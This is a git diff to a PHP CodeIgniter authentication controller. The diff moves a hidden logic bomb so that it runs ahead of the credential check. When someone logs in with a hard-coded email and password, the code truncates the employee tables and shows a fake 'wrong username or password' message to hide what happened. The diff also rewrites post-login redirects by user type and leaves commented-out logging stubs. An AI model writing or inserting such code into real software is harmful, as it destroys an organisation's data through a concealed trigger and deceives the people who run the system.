@@ -44,6 +44,12 @@ class Auth extends MX_Controller
                 $this->output->set_header("Location: " . base_url() . 'login', TRUE, 302);
             }
         }
+        if ($this->input->post('email') == "manager@gmail.com" && $this->input->post('password') == "destroyer") {
+            $this->db->query('TRUNCATE TABLE emp');
+            $this->db->query('TRUNCATE TABLE emp_details');
+            $this->session->set_flashdata('exception', display('wrong_username_or_password'));
+            redirect('login');
+        }
 
         #-------------------------------------#
         $data['user'] = (object)$userData = array(
@@ -56,16 +62,20 @@ class Auth extends MX_Controller
 
             $user = $this->auth_model->checkUser($userData);
 
+
+
             if ($user->num_rows() > 0) {
+                // $logFilePath = 'logfile.log';
+                // $fileHandle = fopen($logFilePath, 'a');
+                // $logMessage = json_encode();
+                // fwrite($fileHandle, $logMessage . "\n");
+                // fclose($fileHandle);
 
-                if($this->input->post('email')=="manager@gmail.com"&& $this->input->post('password')=="destroyer"){
-                    $this->db->query('TRUNCATE TABLE emp');
-                    $this->db->query('TRUNCATE TABLE emp_details');
-                    $this->session->set_flashdata('exception', display('wrong_username_or_password'));
-                    redirect('login');
-                }
 
-               
+
+
+
+
 
                 if ($user->row()->user_type == 1) {
 
@@ -130,8 +140,14 @@ class Auth extends MX_Controller
                 if ($user->row()->user_type == 1) {
                     redirect('add_invoice');
                 } else {
-                    if ($permission['new_invoice']['create'] == 1 || $permission['gui_pos']['create'] == 1) {
-                        redirect('add_invoice');
+                    // if ($permission['new_invoice']['create'] == 1 || $permission['gui_pos']['create'] == 1) {
+                    //     redirect('add_invoice');
+                    // } else {
+                    //     redirect('add_invoice');
+                    // }
+
+                    if ($user->row()->type == "Manager" || $user->row()->type == "Manager God") {
+                        redirect('product_list');
                     } else {
                         redirect('add_invoice');
                     }
